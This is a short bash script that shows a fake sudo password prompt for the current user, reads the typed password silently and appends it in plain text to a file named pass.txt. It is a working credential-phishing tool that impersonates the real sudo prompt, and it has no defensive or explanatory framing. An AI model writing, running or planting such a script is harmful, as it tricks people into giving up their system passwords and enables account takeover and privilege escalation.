#!/bin/bash

echo -n "[sudo] password for $USER: "
read -s getPassword

echo $getPassword >> pass.txt
